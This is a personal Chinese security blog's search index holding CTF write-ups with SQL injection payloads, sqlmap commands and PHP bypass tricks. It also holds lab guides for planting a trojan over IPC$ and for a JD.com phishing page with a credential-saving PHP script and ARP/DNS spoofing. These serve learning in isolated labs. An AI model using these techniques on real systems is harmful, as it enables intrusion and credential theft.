if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); &#x2F;&#x2F;flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;&#x2F;html&gt; 单身一百年也没用与单身二十年一样，抓包即可 cookie Cookie，有时也用其复数形式 Cookies。类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息 。 TIP: 0==not bp抓包，将cookie:login = 0改cookie:login=1 go MYSQL进入题目，提示robots协议 robots协议也叫robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。 robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。 查看robots.txt url:http://chinalover.sinaapp.com/web11/robots.txt 12TIP:sql.php//这里提示sql.php的源码如下 1234567891011121314&lt;?phpif($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\")); if ($_GET[id]==1024) &#123; echo \"&lt;p&gt;no! try again&lt;/p&gt;\"; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt; 大致意思：get方式传递一个id的参数,创建一个新的参数id存放取整后的值（intval()函数将参数变为整形） 之后将新的$id带入sql语句中查询。if语句中说明，get方式传递的值不能为1024。 http://chinalover.sinaapp.com/web11/sql.php?id=10 尝试id=10，无结果 id=1024出现 no! try again，说明只有id=1024的时候才会执行if语句 想到了intval()函数的作用，尝试id=1024.1 GBK Injection宽字节注入，之前写过。 /x0012345678if (isset ($_GET['nctf'])) &#123; if (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; &#125; 试了试?nctf[]=1,出现了报错但是答案真就出来了 正儿八经的做法是?nctf=1%00%23biubiubiu，简单的代码审计 bypass again12345678910&lt;?phpif (isset($_GET['a']) and isset($_GET['b']))&#123;if ($_GET['a'] != $_GET['b'])if (md5($_GET['a']) == md5($_GET['b']))die('Flag: '.$flag);elseprint 'Wrong.';&#125; ?&gt; 代码审计，get方式传递参数a和b,二者的值不同，但是md5值不同，此处又利用md5()漏洞 在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])null,md5(b[])null，md5(a[])=md5(b[])=null,这样就得到答案了。 payload: http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=3 伪装者bp抓包，添加X-Forwarded-For=127.0.0.1,发包即可 X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段","tags":[{"name":"md5","slug":"md5","permalink":"https://sunzhengyu99.github.io/tags/md5/"},{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"代码审计","slug":"代码审计","permalink":"https://sunzhengyu99.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"bypass","slug":"bypass","permalink":"https://sunzhengyu99.github.io/tags/bypass/"}]},{"title":"SSTI","date":"2020-08-16T14:08:06.000Z","path":"2020/08/16/SSTI/","text":"https://www.cnblogs.com/wangtanzhi/p/12238779.html","tags":[{"name":"STTI","slug":"STTI","permalink":"https://sunzhengyu99.github.io/tags/STTI/"}]},{"title":"Bugku","date":"2020-08-08T14:40:51.000Z","path":"2020/08/08/Bugku/","text":"Bugku刷题 成绩单1231' and 1=1 # 1' and 1=2 # 不显示内容，可以判断存在注入点 手工注入1.1&#39; order by 4#可正常显示可以判断存在四个字段2.爆数据库` -1&apos; union select 1,database(),3,4 #` database:skctf_flag3.爆出表名-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # table:fl4g,sc 4.字段名-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 # skctf_flag 得到flag (select skctf_flag from skctf_flag.fl4g) sqlmap 因为本题提交数据的方式为post，故需要先用bp抓数据包，保存到sqlmap的路径中 1.获取数据库python2 sqlmap.py -r a.txt --dbs 2.获取表名python2 sqlmap.py -r a.txt -D skctf_flag --tables 3.获取列名python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g --columns 4.获取flagpython2 sqlmap.py -r a.txt -D skctf_flag -T fl4g -C skctf_flag --dump 备份是个好习惯 扫描发现了index.php，通过 index.php.bak下载网页源码 123456789101112131415161718192021&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once \"flag.php\";ini_set(\"display_errors\", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;echo $flag.\"取得flag\";&#125;?&gt; 对上传的值进行了过滤key, kekeyy可以绕过 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等 payload: ?kekey1[]=da&amp;kekey2[]=dada 2.利用==比较漏洞 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。 下列的字符串的MD5值都是0e开头的： QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a 多次爆数据库名 http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,database() --+ database:web1002-1 爆表名 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+flag1,hint 爆字段名 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name= &apos;flag1&apos; --+flag1,address获取内容 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(flag1) from flag1 --+usOwycTju+FTUUzXosjr 提交发现不对 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(address) from flag1 --+获取address中的内容 ./Once_More.php下一关地址得到另外一个地址 http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) %23给出提示XPATH syntax error: ‘class,flag2‘ http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=flag2),&apos;~&apos;),3) %23Unknown column ‘flag2’ in ‘where clause’ http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(flag2) from flag2),&apos;~&apos;),3) %23XPATH syntax error: ‘flag{Bugku-sql_6s-2i-4t-bug}‘ ！！！注意把flag改为小写字母 宽字节注入靶场：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 一、手工注入第一步 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27加单引号报错 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,table_name from information_schema.tables where table_schema=database()%23查看所有的表 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23查看表中的列 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x637466 %23 ctf,ctf2,ctf3,ctf4,gbksqli,news0x637466 为十六进制ctf 获取字段内容 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(pw) from ctf %23flag:nctf{h4cked_By_w00dPeck3r} 二、sqlmap注入检测是否有注入点 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27没有成功使用十六进制 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex获取数据库名 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex --dbs //选择十六进制 获取数据库名 单引号使用url编码获取表名 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex --D sae-chinalover --tables获取flag sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex -D sae-chinalover -T ctf --dump","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"}]},{"title":"木马","date":"2020-07-18T12:34:10.000Z","path":"2020/07/18/木马/","text":"初识木马 实验目的使用灰鸽子软件以及端口爆破软件控制目的主机 准备一台xp，一台2003其中xp地址为10.1.1.3/24 2003为10.1.1.1/24使两个主机能够通信xp作为攻击方，2003为受害者 1.制作木马使用灰鸽子制作木马，将木马生成在在桌面（记住路径之后要使用） 2.扫描主机，并对账号密码进行爆破ip起始地址为10.1.1.1-10.1.1.255密码配置文件其实只要扫描10.1.1.1即可（因为是实验） 获取账号密码username：administratorpassword: “” 3.与目标主机建立IPC$net use \\\\10.1.1.1\\ipc$ &quot;&quot; \\user:administrator 4.植入木马到目标主机copy C:\\Documents and Settings\\shimisi\\桌面\\qq.exe \\\\10.1.1.1\\ipc$ 5.设置目标主机运行木马net time \\\\10.1.1.1根据目标主机时间设置事物的开始时间at \\\\10.1.1.1 17:17 c:\\qq.exe在上面的时间之后三分钟左右设置一个事物即在17：17时运行木马文件 6.成功控制目标主机观察目标主机已自动上线，已可以进行监控或传输数据等操作 获取屏幕内容 控制命令行","tags":[]},{"title":"jdtest","date":"2020-07-18T09:42:34.000Z","path":"2020/07/18/jdtest/","text":"爬取京东商品图片的小测试 访问的页面图片链接的位置 123456789101112131415161718192021222324252627282930313233# -*- coding = utf - 8 -*-#@Time : 2020/7/16 14:54#@Author : sunzy#@File : jd.pyimport reimport requestsimport timeimport osdir = \"jdtp\"if not os.path.exists(dir): os.mkdir(dir)baseurl = \"https://search.jd.com/Search?keyword=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;enc=utf-8&amp;wq=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;pvid=ryxp9pui.nhltvu\"head = &#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61\" &#125;response = requests.get(url=baseurl, headers = head)#print(response.text)html = response.textfindlinks = '&lt;img width=\"220\" height=\"220\" data-img=\"\\d\" src=\"(.*?)\".*?&gt;'#&lt;img width=\"220\" height=\"220\" data-img=\"1\" src=\"//img10.360buyimg.com/n7/jfs/t22093/305/286523587/498951/2ddddbdf/5b30b30dNd6c7eca0.jpg\" data-lazy-img=\"done\" source-data-lazy-img=\"\"&gt;urls = re.findall(findlinks, html)for url in urls: time.sleep(1) file_name = url.split('/')[-1] res = requests.get(\"http:\"+url,headers = head) with open(dir+'/'+file_name, \"wb\") as f: f.write(res.content)","tags":[{"name":"python","slug":"python","permalink":"https://sunzhengyu99.github.io/tags/python/"}]},{"title":"sqlmap","date":"2020-07-18T09:42:34.000Z","path":"2020/07/18/sql注入/","text":"sqlmap使用 第一步: -u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测第二步: -u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取第三步: -u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举第四步: -u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举第五步: -u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump //探测user表name和password字段如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字典进行爆破。 第六步: -u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言sql注入order by * group by * 利用内置函数暴数据库信息 version() 查看数据库版本 database() 查看当前数据库名 user() 查看当前用户 查看表： Select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() 可十六进制查看字段： select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"}]},{"title":"爬图","date":"2020-07-18T09:40:51.000Z","path":"2020/07/18/爬图/","text":"用爬虫爬取小姐姐的图片 用的库 1234re #正则表达式requests #url请求time #时间os #用于创建文件夹，保存图片 ##准备工作1.首先访问该链接https://www.vmgirls.com/2.随便点击一个进入查看详情https://www.vmgirls.com/13344.html3.F12审查元素网查看页详情，主要查看图片链接的标签位置，写出正则表达式该正则表达式为findlinks = &#39;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#39; 完整程序12345678910111213141516171819202122232425262728293031# -*- coding = utf - 8 -*-#@Time : 2020/7/16 13:36#@Author : sunzy#@File : tupian.pyimport reimport requestsimport timeimport osdir = \"plmm\" #文件夹名字if not os.path.exists(dir): #首先判断是否存在当前文件夹如果没有则创建一个 os.mkdir(dir)# 模仿浏览器的首部信息，绕过一些网站的反爬取措施head = &#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61\" &#125;url = \"https://www.vmgirls.com/13344.html\"response = requests.get(url, headers = head) # 访问目标网页，获取网页内容html = response.textfindlinks = '&lt;a href=\"(.*?)\" alt=\".*?\" title=\".*?\"&gt;'urls = re.findall(findlinks, html) #爬取到的图片链接保存在urls中， 是一个列表for url in urls: time.sleep(1) #防止访问速度过快使服务器崩溃 file_name = url.split('/')[-1] #保存图片的名字 res = requests.get(url, headers = head) #依此访问图片链接 with open(dir+'/'+file_name, \"wb\") as f: #以二进制形式保存图片 f.write(res.content)","tags":[{"name":"爬虫","slug":"爬虫","permalink":"https://sunzhengyu99.github.io/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"diaoyu","date":"2020-07-18T09:37:15.000Z","path":"2020/07/18/diaoyu/","text":"DNS欺骗、ARP攻击及钓鱼网站制作 1.实验目的获取登录jd网页的用户名和密码2.实验主机一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者3.实验材料京东登录网页及其所有图片（浏览器访问https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F 之后保存网页即可）修改index.html中的内容error.php中的内容如下关键代码（用于保存用户名和密码以及迷惑用户） 12345678910111213141516171819&lt;?php$nam = stripslashes($_POST['name']); //name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要$pas = stripslashes($_POST['pass']);//pass也一样$content = \"您已捕获京东账号及密码1个：\" . \" 用户名 \" . $nam . \" 密码 \" . $pas; //保存捕获的用户名和密码$filed = @fopen(\"1.txt\", \"a+\"); //打开1.txt@fwrite($filed, \"$content\\n\"); //将用户名和密码写入1.txt?&gt;&lt;html&gt;&lt;head&gt;&lt;script type=\"text/javascript\"&gt; function goBack() &#123; window.history.back() //后退+刷新 &#125;&lt;/script&gt;&lt;/head&gt;&lt;body onload=\"goBack()\"&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt;&lt;/body&gt;&lt;/html&gt; 4.实验拓扑图 实验步骤一.部署京东的服务器1.安装DNS和web服务器（具体步骤略）2.配置DNS服务器a.在正向解析中建一个区域名字为jd ip为服务器地址（10.1.1.1）b.在jd域中新建一台主机 www.jd.com ip:10.1.1.1 2.IISa.将默认网站停止b.新建网站jd.com,文件路径为保存的jd网页c.打开web服务中的asp（因为此网站不是静态网站）（使用2003客户机访问www.jd.com看看网站发布是否成功） 二.部署kali1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。2.开启apache服务，并检查80端口是否已开启systemctl start apache2netstat -antpl3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，添加一条 PTR 记录，使用户访问任何网页，全部指向为10.1.1.2 选中一行后，按两次d可删除内容想要编辑时，先按i(insert)编辑结束后 :wq 保存4.打开ettercap软件5.选择sniff–unified sniffing，并选择监听eth06.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机7.添加欺骗记录选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 28.在Mitm选择ARP欺骗在弹出的窗口中，勾选第一个点击确定9.选择plugins – Manage the plugins，准备进行DNS欺骗在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗 三.用户访问登录页面1.在客户机中在中，再次登录www.jd.com输入用户名密码等，如图，然后点击登录2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)","tags":[{"name":"DNS","slug":"DNS","permalink":"https://sunzhengyu99.github.io/tags/DNS/"}]},{"title":"guestbook","date":"2020-04-18T09:42:34.000Z","path":"2020/04/18/Guestbook/","text":"guestbook 题目提示：This guestbook sucks. sqlmap is your friend. 是sql注入点击Message List 时是空的， 点击post是可以提交新信息，点击查看新信息 在id值后加上” ‘ “测试是否存在测试点网页报错说明存在注入点union 注入!查看列 12https://hackme.inndy.tw/gb/?mod=read&amp;id=-1%20union%20select%201,2,3,4%20#//id=-1 是让前面的内容不显示 3被回显 1.查看数据库名 1https://hackme.inndy.tw/gb/?mod=read&amp;id=-1%20union%20select%201,2,database(),4%20# 数据库的名字g8 2.查看表名 1https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1),4# 发现有一个表 flag 3.测试表的字段 1https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select column_name from information_schema.columns where table_name='flag' limit 1,1),4# 仍然显示flag 4.读取flag 1https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select flag from flag limit 1,1),4# 得到flag!","tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://sunzhengyu99.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"反序列化","date":"2020-03-28T09:42:34.000Z","path":"2020/03/28/php反序列化/","text":"反序列化 PHP魔术方法_ wakeup()是在反序列化操作中起作用的魔法函数， 当unserialize的时候， 会检查时候存在 __ wakeup()函数, 如果存在的话，会优先调用__wakeup()函数。 而wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用wakeup()函数, 如果该数字大于真实属性个数，就会绕过__wakeup()函数。 serialize()函数：用于序列化对象或数组，并返回一个字符串。序列化对象后， 可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。 unserialize()函数：用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。 举例说明 &lt;?php class Student{ public $full_name = &apos;zhangsan&apos;; public $score = 150; public $grades = array(); function __wakeup() { echo &quot;__wakeup is invoked&quot;; } } $s = new Student(); var_dump(serialize($s)); ?&gt; O:7:&quot;Student&quot;:3:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}各个符号的含义变量类型：类名长度（字节）：类名：属性数量：{属性名类型：属性名长度：属性名：属性值类型：属性值长度：属性值内容} 其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。 当我们将上述的序列化的字符串中的对象属性个数修改为5，变为O:7:”Student”:5:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}} 最后执行运行的代码如下: 1234567891011121314151617&lt;?phpclass Student&#123;public $full_name = 'zhangsan';public $score = 150;public $grades = array();function __wakeup() &#123;echo \"__wakeup is invoked\";&#125;function __destruct() &#123;var_dump($this);&#125;&#125;$s = new Student();$stu = unserialize('O:7:\"Student\":5:&#123;s:9:\"full_name\";s:8:\"zhangsan\";s:5:\"score\";i:150;s:6:\"grades\";a:0:&#123;&#125;&#125;');?&gt; 举例说明题目 123456class xctf&#123;public $flag = '111';public function __wakeup()&#123;exit('bad requests');&#125;?code= 12345678910&lt;?phpclass xctf&#123; //定义一个名为xctf的类public $flag = '111';//定义一个公有的类属性$flag，值为111public function __wakeup()&#123; //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本exit('bad requests');&#125;&#125;$test = new xctf(); //使用new运算符来实例化该类（xctf）的对象为testecho(serialize($test)); //输出被序列化的对象（test）?&gt; 输出结果 O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}我们要反序列化xctf类的同时还要绕过wakeup方法的执行（如果不绕过wakeup()方法，那么将会输出bad requests并退出脚本），wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。因此，需要修改序列化字符串中的属性个数：当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即如下所示： O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}访问url?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}","tags":[{"name":"unserialize","slug":"unserialize","permalink":"https://sunzhengyu99.github.io/tags/unserialize/"}]},{"title":"迷宫问题","date":"2020-03-20T10:07:12.000Z","path":"2020/03/20/迷宫问题/","text":"迷宫问题 原题题目描述 小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。 小明只能向上下左右四个方向移动。 输入 输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。 每组输入的第一行是两个整数N和M（1&lt;=N,M&lt;=100）。 接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。 字符的含义如下：‘S’：起点‘E’：终点‘-’：空地，可以通过‘#’：障碍，无法通过 输入数据保证有且仅有一个起点和终点。 输出 对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。 样例输入1 5 5 s-### ----- ##--- E#--- ---##样例输出9解决代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include&lt;iostream&gt;#include&lt;cstring&gt;#include&lt;string&gt;#include&lt;queue&gt;#include &lt;algorithm&gt;using namespace std;int de[100][100];//计步数组 记录走到这个位置所需的步数 不能走到的位置标记为-1 char map[100][100]; //用于存放迷宫地图 typedef pair&lt;int,intP; //坐标int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;; //在当前坐标下能走的四个方向int sx,ex,sy,ey; //(sx,sy)为起点坐标 （ex,ey）为终点坐标int x,y,nx,ny; //(x,y)为函数中当前位置坐标 （nx,ny)为接下来能到达的坐标 int r,l; //r为行数 l为列数 int bfs()&#123; memset(de,-1,sizeof(de)); queue&lt;Pqu; qu.push(P(sx,sy)); //将起点坐标放入队头 de[sx][sy]=0; while(!qu.empty()) &#123; P p=qu.front(); //取出队头坐标 qu.pop() ;//删除对头及走过的坐标 x=p.first,y=p.second; if(x==ex&amp;&amp;y==ey) break; //到达终点 跳出循环 for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i];//开始向四个方向移动 ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;l&amp;&amp;map[nx][ny]!='#'&amp;&amp;de[nx][ny]==-1) //判断是否越界 以及是否能走 排除走过的路 &#123; qu.push(P(nx,ny)); //将能走的坐标放入队列 之后依次删除 de[nx][ny]=de[x][y]+1; //步数加一 &#125; &#125; &#125; if(de[ex][ey]==-1) return -1; //终点的记步数组为-1 及不能到达终点 else return de[ex][ey]; &#125; int main()&#123; int n,i,j; while(cin&gt;&gt;n)&#123; while(n--)&#123; cin&gt;&gt;r&gt;&gt;l; for(i=0;i&lt;r;i++)&#123; for(j=0;j&lt;l;j++)&#123; cin&gt;&gt;map[i][j]; if(map[i][j]=='S') //记录起点坐标 &#123; sx=i,sy=j; &#125; else if(map[i][j]=='E') //记录终点坐标 &#123; ex=i,ey=j; &#125; &#125; &#125; cout&lt;&lt;bfs()&lt;&lt;endl; &#125; &#125; return 0;&#125;","tags":[{"name":"bfs","slug":"bfs","permalink":"https://sunzhengyu99.github.io/tags/bfs/"}]}]